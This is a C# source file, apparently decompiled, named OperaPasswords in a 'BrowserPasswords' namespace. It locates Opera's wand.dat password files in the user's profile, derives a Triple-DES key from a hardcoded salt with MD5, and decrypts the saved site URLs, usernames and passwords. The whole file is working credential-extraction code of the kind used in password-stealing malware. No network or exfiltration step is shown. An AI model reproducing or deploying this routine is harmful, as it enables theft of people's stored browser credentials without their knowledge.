using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace BrowserPasswords
{
	// Token: 0x0200002D RID: 45
	public class OperaPasswords
	{
		// Token: 0x06000168 RID: 360 RVA: 0x000055C8 File Offset: 0x000037C8
		public static IEnumerable<OperaPassword> EnumeratePasswords()
		{
			string wandFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera\\Opera9\\profile\\wand.dat");
			string wandFileName2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera\\Opera\\wand.dat");
			List<OperaPassword> list = new List<OperaPassword>();
			list.AddRange(OperaPasswords.EnumeratePasswords(wandFileName));
			list.AddRange(OperaPasswords.EnumeratePasswords(wandFileName2));
			return list;
		}

		// Token: 0x06000169 RID: 361 RVA: 0x0000561C File Offset: 0x0000381C
		private static IEnumerable<OperaPassword> EnumeratePasswords(string wandFileName)
		{
			List<OperaPassword> list = new List<OperaPassword>();
			checked
			{
				IEnumerable<OperaPassword> result;
				if (!File.Exists(wandFileName))
				{
					result = list;
				}
				else
				{
					using (FileStream fileStream = new FileStream(wandFileName, FileMode.Open, FileAccess.Read))
					{
						List<OperaPasswords.EncBlock> list2 = new List<OperaPasswords.EncBlock>();
						fileStream.Seek(0L, SeekOrigin.Begin);
						while (fileStream.Position != fileStream.Length)
						{
							OperaPasswords.EncBlock encBlock = OperaPasswords.ReadEncryptedBlock(fileStream);
							if (encBlock != null)
							{
								list2.Add(encBlock);
							}
						}
						fileStream.Seek(0L, SeekOrigin.Begin);
						BinaryReader binaryReader = new BinaryReader(fileStream);
						int num = OperaPasswords.Swap(binaryReader.ReadInt32());
						int num2 = num;
						if (num2 < 5)
						{
							int num3 = 4;
							int num4 = list2.Count - (list2.Count - 4) % 5 - 1;
							for (int i = num3; i <= num4; i += 5)
							{
								list.Add(new OperaPassword(list2[i].DataString, string.Empty, list2[i + 1].DataString, list2[i + 2].DataString, list2[i + 3].DataString, list2[i + 4].DataString, string.Empty));
							}
						}
						else if (num2 == 5)
						{
							int num5 = 4;
							int num6 = list2.Count - (list2.Count - 4) % 6 - 1;
							for (int j = num5; j <= num6; j += 6)
							{
								list.Add(new OperaPassword(list2[j].DataString, list2[j + 1].DataString, list2[j + 2].DataString, list2[j + 3].DataString, list2[j + 4].DataString, list2[j + 5].DataString, string.Empty));
							}
						}
						else
						{
							int l;
							for (int k = 5; k < list2.Count; k = l)
							{
								for (l = k + 1; l < list2.Count; l++)
								{
									if (Regex.IsMatch(list2[l].DataString, "^[0-9A-F]{32}"))
									{
										break;
									}
								}
								if (l - k == 10)
								{
									list.Add(new OperaPassword(list2[l - 7].DataString, list2[k + 2].DataString, list2[l - 6].DataString, list2[l - 5].DataString, list2[l - 4].DataString, list2[l - 3].DataString, list2[k + 1].DataString));
								}
								else
								{
									list.Add(new OperaPassword(list2[l - 5].DataString, list2[k + 2].DataString, list2[l - 4].DataString, list2[l - 3].DataString, list2[l - 2].DataString, list2[l - 1].DataString, list2[k + 1].DataString));
								}
							}
						}
					}
					result = list;
				}
				return result;
			}
		}

		// Token: 0x0600016A RID: 362 RVA: 0x00005938 File Offset: 0x00003B38
		private static int Swap(int i)
		{
			return checked(((i & 255) >> 0 << 24) + ((i & 65280) >> 8 << 16) + ((i & 16711680) >> 16 << 8) + ((i & -16777216) >> 24 << 0));
		}

		// Token: 0x0600016B RID: 363 RVA: 0x0000597C File Offset: 0x00003B7C
		private static OperaPasswords.EncBlock ReadEncryptedBlock(Stream stream)
		{
			OperaPasswords.EncBlock encBlock = new OperaPasswords.EncBlock();
			checked
			{
				BinaryReader binaryReader;
				for (;;)
				{
					while (stream.Position != stream.Length)
					{
						if (stream.ReadByte() == 0 && stream.ReadByte() == 0 && stream.ReadByte() == 0 && stream.ReadByte() == 8)
						{
							break;
						}
					}
					if (stream.Position == stream.Length)
					{
						break;
					}
					long offset = stream.Seek(-8L, SeekOrigin.Current) + 8L;
					binaryReader = new BinaryReader(stream);
					encBlock.BlockSize = OperaPasswords.Swap(binaryReader.ReadInt32());
					encBlock.DESKeyLength = OperaPasswords.Swap(binaryReader.ReadInt32());
					encBlock.DESKey = binaryReader.ReadBytes(8);
					encBlock.DataLength = OperaPasswords.Swap(binaryReader.ReadInt32());
					if (encBlock.DataLength + 16 == encBlock.BlockSize)
					{
						goto IL_D4;
					}
					stream.Seek(offset, SeekOrigin.Begin);
				}
				return null;
				IL_D4:
				encBlock.Data = binaryReader.ReadBytes(encBlock.DataLength);
				byte[] array = new byte[]
				{
					131,
					125,
					252,
					15,
					142,
					179,
					232,
					105,
					115,
					175,
					byte.MaxValue
				};
				byte[] array2 = new byte[256];
				Array.Copy(array, array2, array.Length);
				Array.ConstrainedCopy(encBlock.DESKey, 0, array2, array.Length, encBlock.DESKey.Length);
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] array3 = md5CryptoServiceProvider.ComputeHash(array2, 0, array.Length + encBlock.DESKey.Length);
				Array.Copy(array3, array2, array3.Length);
				Array.ConstrainedCopy(array, 0, array2, array3.Length, array.Length);
				Array.ConstrainedCopy(encBlock.DESKey, 0, array2, array3.Length + array.Length, encBlock.DESKey.Length);
				byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(array2, 0, array3.Length + array.Length + encBlock.DESKey.Length);
				byte[] array4 = new byte[24];
				Array.ConstrainedCopy(array3, 0, array4, 0, 8);
				Array.ConstrainedCopy(array3, 8, array4, 8, 8);
				Array.ConstrainedCopy(sourceArray, 0, array4, 16, 8);
				byte[] array5 = new byte[8];
				Array.ConstrainedCopy(sourceArray, 8, array5, 0, 8);
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(array4, array5);
				CryptoStream cryptoStream = new CryptoStream(new MemoryStream(encBlock.Data), transform, CryptoStreamMode.Read);
				MemoryStream memoryStream = new MemoryStream();
				byte[] array6 = new byte[256];
				for (int num = cryptoStream.Read(array6, 0, array6.Length); num != 0; num = cryptoStream.Read(array6, 0, array6.Length))
				{
					memoryStream.Write(array6, 0, num);
				}
				encBlock.DataString = Encoding.Unicode.GetString(memoryStream.ToArray());
				return encBlock;
			}
		}

		// Token: 0x0200002E RID: 46
		private class EncBlock
		{
			// Token: 0x0600016D RID: 365 RVA: 0x00005C54 File Offset: 0x00003E54
			public override string ToString()
			{
				return this.DataString;
			}

			// Token: 0x0400012B RID: 299
			public int BlockSize;

			// Token: 0x0400012C RID: 300
			public int DESKeyLength;

			// Token: 0x0400012D RID: 301
			public byte[] DESKey;

			// Token: 0x0400012E RID: 302
			public int DataLength;

			// Token: 0x0400012F RID: 303
			public byte[] Data;

			// Token: 0x04000130 RID: 304
			public string DataString;
		}
	}
}
